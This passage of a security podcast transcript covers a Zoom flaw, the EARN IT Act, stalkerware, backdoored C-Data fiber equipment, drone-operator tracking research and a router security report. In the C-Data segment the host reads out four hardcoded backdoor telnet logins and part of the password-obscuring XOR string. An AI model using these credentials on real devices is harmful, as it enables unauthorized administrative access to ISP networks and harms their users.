Or maybe, as a sort of an interim step, content will be flagged as being from a verified source or not.  Sort of like verified Twitter identities that would allow users to choose what level of veracity and/or risk they wish to accept.  Or make it just very, very visible that something is from a verified source or not.  We have that with HTTP versus HTTPS.  We have the lock icon saying that this was secure.  Initially it was to protect users from submitting content over an insecure link.  Then later it became an aspect of reputation.  It was the reputation was better.



Then of course, as we know, security became just a given for all websites so that now if a site doesn't have a TLS certificate, it's like it's said to be insecure.  But in any event, they had to pull down, you know,  Mozilla had to pull it down.  They're going to change the way it works and then bring it back up.  Maybe they'll do more things.  We don't really know.  But it had to go away because it was being abused.  So it's sort of sad to see that happen, and to sort of see the dream of an anonymous Internet sort of slowly disappearing, being chipped away at.



And speaking of Zoom, they fixed a new remote code execution flaw that turned out to be affecting Windows 7 and earlier systems.  And it was a bit of an odd chain of events.  A private researcher, who wishes to remain anonymous and still is, quietly reported his discovery of what was at the time an unknown remote code execution vulnerability in the Zoom client, which affects all versions of Windows up to and including 7 and probably its likely matching Windows Server 2008 R2.



He did not report it to Zoom.  For some reason he reported to Acros Security, who are those 0patch guys, the guys that create the little, quickie, really very small patches of components of the Windows operating system and do so immediately, often beating Microsoft to an official patch by weeks, sometimes even longer.  So Acros, the 0patch guys, knew about this.  They confirmed and reproduced the problem, including creating a proof-of-concept demo video of this.  Then they privately and responsibly disclosed the problem to Zoom.



So last Thursday, July 9th, 0patch blogged about the discovery.  They said:  "Earlier this week a security researcher shared a remote code execution 'zero-day' vulnerability" - and I have "zero-day" in quotes for a reason I'll come back to in a moment.  They said:  "...a zero-day vulnerability in the Zoom Client for  Windows with our team.  The vulnerability allows a remote attacker to execute arbitrary code on a victim's computer where the Zoom Client for Windows," and, they said, "any currently supported version is installed by getting the user to perform some typical action such as opening a document.  No security warning is shown to the user in the course of attack.



"The researcher, who wants to keep their identity private, stated that they did not report the vulnerability to Zoom either directly or through a broker, but would not object to us reporting it to Zoom.  We analyzed the issue and determined it to only be exploitable on Windows 7 and older systems.  While Microsoft's official support for Windows 7 ended this January, there are still millions of home and corporate users prolonging its useful service life with Microsoft's extended security updates or with 0patch," which of course is their product.



They said:  "We documented the issue, along with several attack scenarios, and reported it to Zoom earlier today along with a working proof of concept and recommendations for fixing.  Should a bug bounty be awarded by Zoom, it shall be waived in favor of a charity of the researcher's choice.  On the micropatching side," they said, "we were able to quickly create a micropatch that removes the vulnerability in four different places in the code.  The micropatch was then ported from the latest version of the Zoom Client for Windows," which is 5.1.2, "to previous five versions back to 5.0.3 released on May 17th of 2020.



"The Zoom Client features a fairly persistent auto-update functionality that is likely to keep home users updated unless they really don't want to be.  However, enterprise admins often like to keep control of updates and may stay a couple of versions behind, especially if no security bugs were fixed in the latest versions."  And they said, parens, "(which is currently the case)."



They finished:  "Our micropatches have already been released and distributed to all online 0patch Agents.  Zoom users with 0patch installed are therefore no longer affected by this issue.  According to our guidelines, we're providing these micropatches to everyone for free until Zoom has fixed the issue or made a decision not to fix it.  To minimize the risk of exploitation on systems without 0patch, we're not publishing details on this vulnerability until Zoom has fixed the issue, or made a decision not to fix it, or until such details have become public knowledge in any other way."



And then, in an update to that blog posting yesterday, Monday, they amended the posting to add:  "Update 7/13.  Zoom only took one day to issue a new version of the Client for Windows that fixes this vulnerability, which is remarkable.  We've reviewed their fix and can confirm that it efficiently resolves the vulnerability.  With an official vendor fix available to all users, we have made our micropatches for this PRO-only according to our guidelines."  And "PRO-only" meaning that paid for 0patch.



"Meanwhile, after issuing micropatches for this issue targeted at Zoom clients for Windows versions 5.03 to 5.12, we noticed a lot of our users being on all of these versions despite Zoom's highly persistent update mechanism."  Which, as an aside, I think it's interesting that for whatever reason people are not staying current, despite the fact that Zoom is pushing people.  Although the oldest one, 5.03, is only May, so it's not like it's really old, but still.  They said:  "We had expected most users to be on version 5.1.2, but this indicates many users may still be on even older Zoom Client versions.  We therefore ported our micropatch to the remaining supported versions of the Zoom Client back to 5.0.0, .0.1, and .0.2."  They said:  "We're now covering all vulnerable supported clients."



So for our listeners we want to make sure that they're keeping their Zoom clients current.  I'm not a Zoom user, so I haven't  experienced what's going on with updating.  But for what it's worth, you want to be on 5.1.3, I think, or later, since Zoom has an aggressive auto-update policy in place and a facility.  I don't understand why people aren't already clear.  The 0patch guys have a bunch of Q&A on their blog posting about the vulnerability, and I put a link to the blog in the show notes.  So anyone who's interested can check out the link.



But I'll also note that, as an industry, we appear to be suffering a bit of definition drift.  This was covered by the tech press as a zero-day.  Now, maybe that's because the tech press just covered what the 0patch people said, and I guess the 0patch wants to sort of call things a zero-day.  But a zero-day is defined as a vulnerability that is first discovered as a result of its being actively exploited in the wild.  It's considered of the highest possible importance and priority specifically because it's already loose.



And by the time it's first seen, it's under exploitation.  And so these 0patch guys came along because they wanted to fix it immediately, which is cool.  They were zero-patching zero-days.  But now they're patching things that are not zero-days, and they're calling them zero-days, which doesn't make them zero-days.  So I'm seeing this in the tech press, like that here, as far as we know, a vulnerability which was identified but has never been abused even once, is being called a zero-day.  But it's not.  It's just a discovery, responsibly reported and remediated before, as far as we know, it was ever abused.  That's the way all regular vulnerabilities are discovered and reported responsibly; right?  They're not zero-days.



So that's the best case, and it's happening all the time.  That's what HackerOne has made their business model.  So since the term "zero-day" has a very specific and important meaning, I'm going to work not to promulgate this misuse of the definition.  And I hope that as an industry we will keep from being over, like, overreactive in our responses to this because it's a useful and good definition that I think we need to hold to.



We have a revision of the EARN IT Act bill, take two.  We'll recall that the EARN IT is the rather tortured acronym for Eliminating Abusive and Rampant Neglect of Interactive Technologies Act of 2020.  It's been revised just a couple days ago in an attempt to collect presumably the votes necessary to get it passed through Congress.  Although it's not clear to me how it achieves that.  I struggled through a bunch of legalese and mumbo jumbo in an attempt to distill what has changed about the bill in its amendment.  And as near as I can see, what the bill has changed is definitely not for the better.



The original bill would have impaneled a 19-person federal commission, predominantly seeded with law enforcement representatives who would have had the power to determine whether this or that website was "in compliance."  And of course that phrase is chilling.  And what they would be determining was whether the website was in compliance with the committee's determination of best practices, whatever that was - which, if they were in compliance, if the site was in compliance, would entitle them to retain the legal protections that all websites currently enjoy and depend upon under Section 230 for hosting user-provided content.  But that was before.  Now, this 19-person federal commission has been abandoned.  With the new bill, handing over - oh, my goodness.



LEO:  Let me guess.  It's just Bill Barr now.  Just Bill Barr.  That's all.



STEVE:  Well, actually he's in the picture still, but it's even worse.  It hands over the power to the 50 individual states of our union.  Lord help us.



LEO:  Are they trying to make this more unworkable?  Is that what they're trying to do?



STEVE:  Oh, Leo.  And I'll just note that we've seen how well allowing each state to determine its own course of action has worked with what has become of the COVID-19 catastrophe, fiasco, mess.  So yes, let's just let every state decide to do what it wants.  Under this newly revised bill, should EARN IT ever become law, individual state lawmakers will be able to create new laws allowing private lawsuits and criminal prosecutions against Internet platforms as long as they say that their purpose is to stop crimes against children.



The EFF summarizes the intent of Section 230 as follows.  The EFF wrote:  "The whole idea behind Section 230 is to make sure that you are responsible for your own speech online, not someone else's.  Currently," they said, "if a state prosecutor wants to bring a criminal case related to something said or done online, or a private lawyer wants to sue, in nearly all cases the prosecutor has to seek out the actual speaker.  They can't just haul a website owner into court because of their user's actions. But that will change if EARN IT passes."



They said:  "Section 230 protections enable the Internet as we know it.  Despite the politicized attacks on Section 230 from both left and right, the law actually works fine.  It's not a shield for Big Tech.  It's a shield for everyone who hosts online conversations.  It protects small messaging and email services, and every blog's comments section.  Once websites lose Section 230 protections, they'll take drastic measures to mitigate their legal exposure.  That will limit free speech across the Internet.  They'll shut down forums and comment sections, and cave to bogus claims that particular users are violating the rules, without doing a proper investigation."



They finish, the EFF says:  "We've seen false accusations succeed in silencing users time and again in the copyright space, and even used to harass innocent users.  If EARN IT passes, the range of possibilities for false accusations and censorship will expand."



They also said, later they said:  "When we say the original EARN IT was a threat to encryption, we're not guessing.  We know that a commission controlled by Attorney General William Barr will try to ban encryption because Barr has said many times that he thinks encrypted services should be compelled to create backdoors for police.  The Manager's Amendment, approved by the Committee today, doesn't eliminate this problem.  It just empowers over 50 jurisdictions to follow Barr's lead in banning encryption."



So with the amended bill, it will only take one state to inspire a wave of prosecutions and lawsuits against online platforms.  And just as some federal law enforcement agencies have declared they're opposed to encryption, so have some state and local police.  The previous version of the bill suggested that if online platforms want to keep their Section 230 immunity, they would need to "earn it," as we know, by following the dictates of an unelected government commission.  But the new text doesn't even give them a chance.



The bill's sponsors simply dropped the "earn" from EARN IT.  Website owners, especially those that enable encryption, will no longer be able to "earn" their immunity from liability for user content under the new bill.  They'll have to defend themselves in court, as soon as a single state-sponsored prosecutor, or even just a lawyer in private practice, decides that offering end-to-end encryption was a sign of indifference towards crimes against children.  And that's the way it's probably going to play out.  So we'll see what happens.



It turns out that stalkerware is becoming more of a thing and is on more people's radar, which actually is probably good.  Stalkerware has grown to become enough of a problem that Google, Apple, AV makers and even the Federal Trade Commission have been pushing back on this growing application segment.  The term "stalkerware" refers to spyware apps designed to allow an abusive partner in a relationship to spy on their significant other by installing spyware onto the other's smartphone without their knowledge or consent.  Sadly, stalkerware is also sometimes referred to as "spouseware."



It turns out that, although it's not highly popular, its use has been steadily increasing this last decade, largely enabled by the proliferation of smartphones that are able to host said malware, or grayware at least, in another person's phone.  It allows partners to keep tabs on their partners at all times by tracking the phone.  And the ready availability of these stalkerware products in official app stores has increased the visibility of them, opening them up to millions of potential users.  According to statistics gathered by Kaspersky, the number of users who had stalkerware-like apps installed on their Android devices increased from 40,386 known devices in 2018 to more than 67,500 one year later.  So better than a 50% increase in 2019.  So the market's not massive, but it is slimy.



According to independent antivirus testing lab AV-Comparatives and the EFF, detection rates for stalkerware applications on Android and Windows devices have slowly improved as the issue is gaining more press coverage, and security vendors are moving in to address the growing risk that this is creating.  And we've touched on this in the past.  The apps are not technically malware.  They sort of fall into that gray zone where they're benign, but they're slimeware, I guess you could call it.



So against this backdrop we have Google's announcement just last week of an important coming update to what they call their "Enabling Dishonest Behavior" policy for advertising across apparently all of their properties.  And they basically created a one-month notice or notification.  They said:  "In August 2020" - so next month - "the Google Ads Enabling Dishonest Behavior policy" - is that an acronym for - GAEDB.  No, I guess they didn't even try.  "Google Ads Enabling Dishonest Behavior policy will be updated to clarify restrictions on advertising for spyware and surveillance technology.  The updated policy will prohibit the promotion of products or services that are marketed or targeted with the express purpose of tracking or monitoring another person or their activities without their authorization.  This policy will apply globally, and we will begin enforcing this policy update on August 11th, 2020.



"Spyware and technology used for intimate partner surveillance, including but not limited to spyware and malware that can be used to monitor texts, phone calls, or browsing history; GPS trackers specifically marketed to spy or track someone without their consent; promotion of surveillance equipment (cameras, audio recorders, dash cams, nanny cams) marketed with the express purpose of spying is covered.  This does not include private investigation services, or products or services designed for parents to track or monitor their underage children.  Violations of this policy will not lead to immediate account suspension without prior warning.  A warning will be issued at least seven days prior to any suspension of an account."



They said:  "Please review this policy update to determine whether or not any of your ads fall in scope of the policy; and, if so, remove those ads before August 11th, 2020."  So I guess they're not saying they're going to remove the apps themselves, but they're just going to say no to any advertising of these sorts of things globally, across all of their products.  So I say yay to that.



LEO:  On we go with the show.



STEVE:  So I don't know what to think about Internet appliances from China that are having a problem.  We have a Chinese Internet equipment vendor very much in the hot seat.  And it's not as if it's not possible, just as possible, for domestic vendors in the U.S. to deliberately plant backdoors in their products.  As we know, the security industry remains quite suspicious of our own American investigative services, the NSA and the CIA.  We have quite strong circumstantial evidence that both organizations are developers of powerful computer subversion and surveillance technology.  I think all large nation-states have such.



And to this day we suspect that the NSA may have influenced the design of the default source of entropy used in RSA's earlier BSAFE crypto API.  And they didn't influence it in a way that made it any stronger, by the way.  So it's certainly not fair, I think, to paint all of China and anything that comes out of China with a broad red brush, when we discover that a particular Chinese vendor is apparently shipping very high-end networking equipment containing multiple apparently deliberate backdoors.



LEO:  And it's not Huawei.



STEVE:  And it's not, exactly, it's not Huawei.



LEO:  What?



STEVE:  Although now I guess they may be, too.  But this one we have absolute proof of.  This is not, like, whoops.  So without drawing any conclusion or rendering any judgment, here's the story.  Last week two security researchers, Pierre Kim and Alexandre Torres, very clearly documented their discover of seven vulnerabilities in the firmware of what's known as FTTH OLT devices - I'll explain that in a second - manufactured by the Chinese equipment vendor C-Data, C hyphen Data.  And these are not consumer products, so it's not a company name known to us.  But apparently it's very popular stuff.  There's a lot of their equipment around.



FTTH stands for Fiber to the Home, and OLT stands for Optical Line Termination.  So taken together, FTTH OLT refers to networking equipment that allows ISPs to bring fiber optic cables as close to the end users as possible, transiting that so-called "last mile" to our doorstep.  These devices are the termination on a fiber optics network.  They convert data from an optical line into an Ethernet cable connection that's plugged in at the end user's home, in datacenters, or business centers.  And they appear all over an ISP's network due to their crucial role.  So this makes them one of today's most widespread types of networking devices at the high end.  And they're situated in millions of network termination endpoints all over the globe, not necessarily C-Data's, but these sorts of things, these FTTH OLT devices.



So Pierre and Alexandre confirmed the vulnerabilities by performing a static code analysis of the latest firmware running on two of C-Data's devices.  But due to the common internal architecture shared by the entire similar family of devices, they believe that the same vulnerabilities impact 27 other of the company's FTTH OLT models, which run the same or very similar firmware.  So a total of 29 different model devices.  Their full report is up now on GitHub, and I've got a link in the show notes for anyone who wants more.



But the seven vulnerabilities are about as bad as it gets.  By far the worst and most disturbing of the seven is the presence of telnet backdoor accounts hardcoded into the firmware.  Yeah, you heard that right:  backdoor telnet accounts hardcoded into the firmware.  Or as they say, that's not a bug, it's a feature.  And yes, it gets worse.  The telnet accounts are on the WAN side interface.  They allow anyone who knows the hardcoded credentials to connect to the device using any telnet client running on the device's WAN interface, that is, a telnet client on the Internet that is able to access the WAN interface.



Pierre and Alexandre said that the accounts granted intruders full administrator command line interface (CLI) access.  Through their static analysis of the firmware of the two devices, they uncovered four username/password combinations hidden in the C-Data firmware.  Those are, and I'm sorry to be, like, these are known because, as we'll get to a minute, they did not - they have not disclosed this responsibly, which makes this a whole lot worse.  So username suma123, password panger (P-A-N-G-E-R) 123; username debug, password debug124; username root, password root126; username guest, with an empty password, believe it or not.  And this initial backdoor command line interface then allows access to exploit additional vulnerabilities.



For example, they said that an intruder could also exploit a second bug to list credentials in cleartext through the telnet command line for all other device administrators, that is, the ones that are officially created.  The credentials could then be used at a later point in case the backdoor account was removed in a subsequent firmware update.  A third vulnerability allowed the attacker, or just like the interloper because it's not much of an attack when you log in with an open telnet port, to execute shell commands with root privileges from any command line account.



A fourth bug was discovered in the same telnet server, running on the WAN interface.  The researchers said that this server could be abused; that using this additional bug, the server could be abused to crash the FTTH OLT device.  Since the server was running by default on the WAN interface, this bug could be used to sabotage an ISP's network if they're not filtering and blocking incoming traffic upstream of the FTTH OLT devices.



But the devices also run a web server - of course they do - that's included to power the device's management web interface.  Here, they found a fifth bug.  By downloading six text files from this web server, an attacker could get their hands on cleartext account credentials for the device's web interface, the telnet server, and the SNMP management interface.  And in case any of the passwords are in an "encrypted," and let's put that in air quotes, format, you'll see in a minute that's not a problem, either, because all credentials are secured by XORing them against a fixed known string.  That string is in the show notes:  *j7a(L and so on.  It's in the show notes.  So if you were to retrieve an encrypted password, not a problem, just XOR it with this string, and you will see what the user originally typed in. 



And last, but not least, the two researchers pointed out that all management interfaces on the tested devices ran in cleartext mode.  In other words, HTTP, not HTTPS; telnet instead of SSH, and so on.  They said this opened devices and the ISPs that used them to easy man-in-the-middle attacks.  Of course, because anybody who was able to sniff any traffic would see everything going back and forth, unencrypted telnet logons, even if they were being used. 



So on top of all this, which is really bad news for anyone who has purchased any of these devices anywhere in the world, as we know, responsible disclosure is the norm.  But Pierre and Alexandre are sure that they cannot explain what they have uncovered as inadvertent mistakes.  And frankly, I would have to agree with them.  How do you possibly explain this?  So they published their complete and detailed findings without notifying the vendor because the nature of what they have found, they felt, could only be explained as a deliberate backdoor functionality, intentionally placed into the firmware by the vendor.  This is not something that is, like, on and can be turned off.  These telnet strings are embedded in the firmware.



They also noted that identifying all vulnerable devices may be a problem for ISPs, as some of the vulnerable equipment appears to have been sold as white-labeled product under different brands,  including OptiLink, V-SOL CN, and BLIY, and perhaps others.  Now, I sympathize with their presumed outrage and their feelings.  But doing what they did is still hugely irresponsible.  Disclosure is not made responsibly to protect  the vendor of the malfunctioning software or hardware.  Disclosure is made responsibly to protect the users of the malfunctioning product.



So no matter whether or not this company's products may have been deliberately backdoored, and I would have to agree it sure does look like they have been, the only responsible thing to do is to inform them in private of what has now been found and give them a fixed hard deadline to update their products' firmware, remove all discovered problems, and send out urgent notices to all their customers and their OEMs, their resellers, informing them of the urgent need to update the firmware.  And then, whether or not the company complies by the deadline, only then, after having given them a reasonable chance of fixing this and getting the patches out to all of their customers who are vulnerable, only then go public with the details.



Instead, what they have done really does create a huge mess.  Now we have presumably, who knows how many tens of thousands of pieces of high-end networking gear spread around the world, located in crucial networking positions, that cannot be readily taken offline.  And if there are 29 different makes and models of these things, there are probably some that are very old.  So who knows how much management they're even getting any longer?  But still, I mean, this was a bad original sin.  But going public with this is, no matter the outrage, can never be responsible.  It's really irresponsible.



So now everyone, all the bad guys in the world know exactly how to exploit these devices.  And the devices, it doesn't take any cleverness.  They're all immediately exploitable.  I imagine there will be scans across the Internet for telnet ports using these newly released credentials to see what that is publicly available can be found.  And if they're not exposed, if some of these things are not exposed to the public, then they're on internal LANs, and there will be new scans for these usernames and passwords.  You know, these guys could have been heroes, but that's not the path that they chose.



So this sort of does bring us to an important point, which is how do purchasers of networking equipment know what they are getting?  It is a huge temptation to purchase an inexpensive piece of equipment from a foreign supplier who may be offering a lot of functionality at a very attractive price.  But first of all, I would be a little skeptical of the fact that it isn't using HTTPS, and it isn't using SSH.  I mean, it does have the feeling of a bargain basement piece of equipment.



Again, I don't have any sense of scale for how widely deployed these 29 different model number devices may be.  But, boy, you know, buyer beware in this instance.  Wow.  And again, yes, it's a Chinese vendor.  Maybe factor that in as a signal in a complex decision about where you want to buy your equipment.  As you said, Leo, it's not Huawei.  But it's C-Data, and we can now prop them up against Huawei and say, well, okay.  Well, I don't really remember whether Huawei has been found definitively doing something wrong like this, or just having a strong suspicion of being a bad actor.  But wow.



LEO:  It depends who you ask.  A lot of governments say Huawei is as bad as this.  But yeah, depends who you ask.  But the problem - so are you better if you buy American made?  And can you even get American made?  Where do you get that?



STEVE:  That's just it.  Cisco's been having a huge bunch of problems recently.  They've been having remote code executions and emergency patches.  Nothing this egregious.  I mean, this is just in-your-face awful.



LEO:  Well, and that's the question.  Is it error or intentional; right?  It's hard to...



STEVE:  This has to be.  This has to be deliberate.



LEO:  This looks intentional, yeah.



STEVE:  You don't embed telnet access, undocumented telnet usernames and passwords in the firmware without it, I mean, without it.  And they could say, oh, it was just meant for, you know, we shipped debugging kernels by mistake.  We never meant to do that.  Okay.



LEO:  I mean, there'd be more subtle ways to do it if you really wanted to do it than putting a telnet in there.  But I don't know.  I don't know.  I don't know.  You know what, encrypt everything.  Trust no one.  Encrypt everything that goes over the network.  Zero knowledge.  Zero trust.  



STEVE:  We all know what a problem locating the sources of remotely piloted consumer drones can be when they're operating illegally in the vicinity of a commercial airport.  Those little guys, those little drones can and have caused serious disruptions in aviation because a drone cannot be allowed to strike the intake of a jet engine.  That would be very bad.  Birds are bad.  Drones are worse.



So as with anonymous postings on the Internet, drone operators have been able to operate under the assumption that they cannot be caught because they cannot be located.  They're able to operate a good distance away.  And with today's camera-equipped drones, they no longer even need line of sight to their little vehicles.  But if they could be reliably located, the word of mouth would spread, and the problem would be largely resolved.  A few highly publicized arrests and the game would change.



So far, the only solution that has been applied is sort of the obvious one.  Surround locations where drones pose a real hazard with radio receiving stations tied back to a central control point, and attempt to use the radio frequency emissions from a drone operator's transmitter to geolocate that device.  Now, in an empty field in the middle of Nebraska, that might work well.  But a busy commercial airport in any modern urban center turns out to be a very different problem.  The air is hugely contaminated, not only with avionic radio frequencies, including high-power radar,  but also the typical ground clutter that you have with cellular phones, WiFi, Bluetooth, IoT, and all manner of other radio frequency generating equipment.  And to further complicate matters, drone operation radio signals can have short duration, their frequency usually hops over most of the band, and they have relatively low power.



So Leo, to address this problem, our industrious academics from Israel's Ben-Gurion University of the Negev, who we're often referring to, have been performing some research, and have just publicized a new paper titled, "Can the operator of a drone be located by following the drone's path?"  For anyone who's curious, I have a link in the show notes.



They said that, well, so far - I did read enough of it to get a sense for it.  I won't go into great detail, but I'll summarize that their work so far has been with simulations.  Their underlying supposition appears to be holding.  The path of a drone being remotely controlled by someone from a distance will inherently contain clues about the location from which that person is viewing the drone.  Just a simple example is that the drone's motion along the line of sight to the viewer will be much less obvious to that viewer than any motion perpendicular to their line of sight to the drone.  So it's reasonable to suppose that this might influence the drone's path.



Unfortunately, this system assumes that the drone is being piloted visually from a remote location and not using an FPV drone-mounted camera.  So the application might be somewhat limited in practice.  But they have trained up neural networks and have been able to predict with 78% accuracy the operator's remote location knowing only the drone's flight path.  So I thought that was pretty cool.  I just wanted to share this since I thought it was interesting and clever and not at all immediately obvious, and also since it was new work from our industrious academics at the Ben-Gurion University of the Negev.



We have a report from Fraunhofer Institute. 



LEO:  Oh, yeah, this thing was terrifying.



STEVE:  I know.  And ridiculous, unfortunately.



LEO:  Oh.  Oh, good.



STEVE:  Yes, yes, that's the good news.



LEO:  Okay.



STEVE:  So the report's title was "Rampant Router Insecurities."  And it's not what it appears.  The tech press has been hyperventilating over a 25-page report from, as I said, the Fraunhofer Institute "Home Router Security Report 2020."  So  just the executive summary.  It's pretty quick, gives you a taste for this.  And this is, of course, what the tech press jumped on.



They wrote:  "This report analyzes 127 different routers for private use developed by seven different large vendors selling their products in Europe.  An automated approach was used to check the routers' most recent firmware versions for five security-related aspects.  We were able to extract completely 117 of the 127 firmware images.  Four firmware images could be extracted partly, and six firmware images could not be extracted at all.  116 of 127, that is, 91% of the devices are powered by Linux.  One was powered by ThreadX and another by eCos.



"The security aspects addressed in this report are:  When were the devices updated the last time?  Which operating system versions are used, and how many known critical vulnerabilities affect these operating system versions?  Which exploit mitigation techniques do the vendors use, and how often do they activate these techniques?  Do the firmware images contain private cryptographic key material?  Are there any hard-coded credentials?"



And they said:  "Our results are alarming.  There is no router without flaws.  46 routers did not get any security update within the last year.  Many routers are affected by hundreds of known vulnerabilities.  Even if the routers got recent updates, many of these known vulnerabilities are not fixed.  What makes matters worse is that exploit mitigation techniques are used rarely.  Some routers have easily crackable or even well-known passwords that cannot be changed by the user.  Most firmware images provide private cryptographic key material.  This means whatever they try to secure with a public-private crypto mechanism is not actually secure at all.



"Nonetheless," they wrote, "vendors seem to prioritize security differently.  Especially AVM" - that must be a European manufacturer - "does a better job than the other vendors regarding most of the security aspects.  However, AVM routers are not flawless.  ASUS and Netgear do a better job on some aspects than D-Link, Linksys, TP-Link, and Zyxel.



"To sum it up," they said, "much more effort is needed to make home routers as secure as current desktop or server systems.  Additionally, our evaluation showed that large-scale automated security analysis of embedded devices is possible today.  We used the Firmware Analysis and Comparison Tool (FACT), and it worked very well for almost all firmware images analyzed during this study.  FACT is an open source software available on GitHub."  And I should mention that it was developed by Fraunhofer.  The "F" of what is now Firmware Analysis used to stand for Fraunhofer before they decided to open it to the public.



So what does this mean?  Is it good?  No.  Is it the end of the world as we know it?  Also no.  Everyone knows that my blanket recommendation would be to use a current build of pfSense, which is built on top of state-of-the-art FreeBSD, and load it onto a little fanless multiport appliance PC.  You get a super solid  platform that's not being continually updated because there are no known problems.  If there were, they'd be fixed.  And the darn thing will do anything you might wish for.



Okay.  So first of all, the comparison with a consumer PC is not fair because a Windows or a Mac or a Linux, it has to be secure against all the random application crap that people run on that OS.  Thank goodness a router is only running its own fixed firmware.  It is not a host to randomly added consumer software, or it would be the end of the world as we know it.  But for what it's worth, it at least is an appliance.  Okay, so it's not pfSense running FreeBSD.  Everyone already has something that they like.  They've got a router that they're using.



So what I'll note here is that the one thing Fraunhofer failed to mention, unless any of these 127 routers is misconfigured to expose vulnerable open ports and services to the public Internet, which could happen, so let's assume that isn't the case.  And that isn't what they're looking at anyway in this study.  All of these vulnerabilities are internal and accessible only from the LAN side of the router, not the WAN side.  Okay. So a router has a hard-coded private key.  That's not as cool as if it generated a random key the first time it was turned on so that then every router of that make and model and firmware edition would be uniquely keyed.  But it's not the end of the world, either.



That's not to say that this is good.  But remember, we were recently talking about a router vulnerability that was so egregious that hostile code running on a web page in the user's browser could be used to reach out to the router and cause some trouble.  But in general, once you have hostile code running loose inside your network, things are already bad.  Note that all the vulnerabilities cited by Fraunhofer require access to the router.



So one way to secure the router would be to block access to the LAN side management services except from, for example, one specific LAN IP.  With pfSense, that's trivially done through its web-based UI.  I don't recall seeing that generally available in consumer routers.  But if it were, use it.  If you were to block management to a specific IP, no system on the LAN could access the router's management, period.  You could have a separate pokey old laptop that's no longer useful for much else as your router management PC.  Its IP would be hard-coded, and it would be your router management laptop that's normally turned off and in a closet.



With pfSense or some other advanced router, you could even give the LAN interface a second IP on a different private network, like a 10-dot.  That way the router's management would not even be on the same network.  It wouldn't be in the same Ethernet broadcast domain as any of the other services on the LAN.  Or you could use VLAN tagging and place a cheap little VLAN-aware smart switch in front of the router to block any access to the management traffic's VLAN that wasn't tagged with the proper VLAN tag.  And of course that would only work for wire traffic.  Oh, I guess, you know, you could do VLAN over WiFi, come to think of it.  So there's another solution.  Bind the management to a wired port or to a VLAN WiFi that cannot be seen by management.



So anyway, you get the idea.  Many solutions are available, depending upon your network and its configuration.  It's true that consumer routers are a problem.  That's worth keeping in mind.  Older routers like older smartphones may no longer be receiving updates, and they may be more of a problem, especially if problems become known that are never going to be fixed in your router's firmware.  But the problem is not existential, and a bit of thought given to strictly limiting all inside access, in the same way that the WAN side is strictly limited or it'd be the end of the world, that might just pay off - if nothing else, for your peace of mind.



So it's worth looking at, you know, poking at your router's UI features and see, for example, if you can put a filter on the router's port 80, or hopefully port 443, the TLS connection port.  Although I don't know if I've seen a router that supports HTTPS.  I think I've seen some that actually do allow themselves to get a cert over the ACME protocol from Let's Encrypt.



LEO:  It's a self-signed - it's often a self-signed cert.  Yeah.  Sometimes they just do a self-signed cert.



STEVE:  Yeah.  And so you get warning notices, and oh my god.



LEO:  They say, yes, I am trying to contact this router.  So let me in.



STEVE:  Right.



LEO:  And then you've exchanged certs.  So from then on it's a secure conversation.  You just have to be careful that first time; right?



STEVE:  Right, right.  You say yes, I will trust something from this self-signed cert, the device, yeah.



LEO:  I've seen that.



STEVE:  So a little bit of miscellany, Leo.  I just wanted to mention I was grumbling about the price hike of YouTube TV?  Well, I uncanceled my subscription to it.  



LEO:  Oh, really.  Sling, you mean.



STEVE:  Yeah, I was going to move over...



LEO:  Oh, you uncanceled YouTube because you were going to move to Sling; right.



STEVE:  Right.  I was going to move to Sling.  



LEO:  It's not very good, is it.



STEVE:  And I didn't make it very far, since I really, really, really need the recorded content scrubber to work correctly.



LEO:  Right.



STEVE:  "Working correctly" means that you can pause the content and then jump forward or backward by some amount of time, and you get to see a thumbnail of where you now are.  It's critical for the way I watch content.  And YouTube TV works exactly like  that on my Roku.  I get to pause it, and then I can jump forward and backward, typically over the commercial until I see that the show has started again.  Then I'll back up one frame and unpause.  It's perfect.



Sling TV works in that annoying progressively faster and faster if you push the fast-forward or fast-reverse button either way.  But it's totally blind.  You can't see where you are.  So anyway, no fixed-time jumping, and no, thank you.  I just said, well, it would have saved me some money, but it's worth it for me to pay the extra monthly fee in order to get movement through pre-recorded shows the way I think it should be done.  



LEO:  And a much better selection of channels.  I have to say Sling is kind of scant in its offerings.



STEVE:  Yeah.



LEO:  We're just stuck, unfortunately.



STEVE:  And as you said, it's the standard bundling.  It's just we have moved from cable delivery over to streaming delivery.



LEO:  It's still cable, basically.  It's the same price model, yeah.



STEVE:  Yeah, maybe someday somebody will challenge the bundlers.  Although I guess I don't know how that happens because bundles are bundles.



LEO:  Right.  It's the content guys who really determine it in the long run.  And that's what they want, yeah.



STEVE:  Yeah.  So Leo?



LEO:  Yes?



STEVE:  I was reading a couple days ago about how the Linux team has approved new terminology banning, officially banning terms like "blacklist" and "slave."



LEO:  Right.



STEVE:  And of course we've been touching on this topic of insensitive language and terminology in our technology.  And I thought, why not do my part, too?  As I've been working on SpinRite's forthcoming technology, I've been thinking about our new "woke" awareness of the challenges faced by those in any highly heterogeneous culture and environment.  Even when we're all created equal, we're all still created differently.



So in that spirit, in a spirit of accepting these differences, I realized that labeling a sector as "bad" is really quite harsh.  I mean, it's not really a "bad" sector.  At the moment it's just checksum challenged.  It's error non-correcting, or just having a weak bit.  It's not bad, it's just different from its neighboring sectors.  And so SpinRite's newly enlightened job will be to have a gentle conversation with the sector.  SpinRite will check in with it to see how it's feeling.  SpinRite will work with the sector to bring about the change that will be in everyone's long-term best interest.  And you know, 4,096 bits is a lot of bits.  Oh, my goodness.



So if it should turn out that this particular, otherwise beautiful and perfect little sector just can't get the hang of holding onto every one of those oh, so many bits, well, then SpinRite will find a nice place for it to go so that it just doesn't need to worry about all that any longer.  It's a lot, after all.  So it will be able to just rest and relax and live out the rest of its drive's life in peace.  It will still be there, but a fresh and brand new sector will be taking over, handling all of its bits for it so that it just doesn't need to worry about all of that anymore.



So in the future SpinRite we're not going to have any bad sectors.  No.  We're just going to have some that SpinRite decides have already worked as hard as they need to, and it's time to just give them a rest and give some brand new sectors that have been waiting all this time their own chance to hold onto all of those bits for their owner.  It's 2020, after all, and this really feels much better.



So it's not a Technado, Leo, it's a Tsunami.



LEO:  Don's show is a Technado; but this, a Tsunami.



STEVE:  This is a Tsunami.



LEO:  Which is probably just as bad.



